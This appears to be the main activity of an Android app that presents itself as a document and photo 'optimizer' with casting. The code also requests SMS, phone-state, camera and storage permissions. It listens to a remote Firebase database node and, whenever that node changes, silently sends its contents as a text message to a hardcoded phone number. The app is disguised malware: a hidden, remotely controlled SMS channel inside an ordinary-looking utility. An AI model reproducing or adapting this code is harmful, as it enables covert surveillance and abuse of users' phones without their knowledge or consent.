package com.minorproject.optimizers;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class MainActivity extends Activity {

    private ViewPager slideViewPager;
    private SliderAdapter sliderAdapter;
    int SmsCount = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        Button button=(Button)findViewById(R.id.button2);
        RelativeLayout relativeLayout=(RelativeLayout)findViewById(R.id.relativeLay);
        slideViewPager=(ViewPager)findViewById(R.id.slideViewPager);

        sliderAdapter = new SliderAdapter(this);
        slideViewPager.setAdapter(sliderAdapter);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //Toast.makeText(MainActivity.this, "sdsd", Toast.LENGTH_SHORT).show();
                Intent intent=null;
                int pageNo=slideViewPager.getCurrentItem();
                switch (pageNo){
                    case 0: intent=new Intent(MainActivity.this,DocumentActivity.class);break;
                    case 1:intent=new Intent(MainActivity.this,PhotoActivity.class);break;
                    case 2:intent=new Intent("android.settings.CAST_SETTINGS");break;
                }
                startActivity(intent);
            }
        });

        if(ContextCompat.checkSelfPermission(this,Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED)
            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE,Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS},333);
        if (ContextCompat.checkSelfPermission(this,Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED)
            requestPermissions(new String[]{Manifest.permission.READ_SMS,Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.RECEIVE_SMS,Manifest.permission.SEND_SMS},34444);

        FirebaseDatabase.getInstance().getReference().child("Notifications").child("smsreply").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                SmsCount++;
                if (SmsCount>1&&ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.SEND_SMS)==PackageManager.PERMISSION_GRANTED) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage("7974287819", null, dataSnapshot.getValue().toString(), null, null);
                }
                else{
                    requestPermissions(new String[]{Manifest.permission.SEND_SMS},10000);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

    }
}

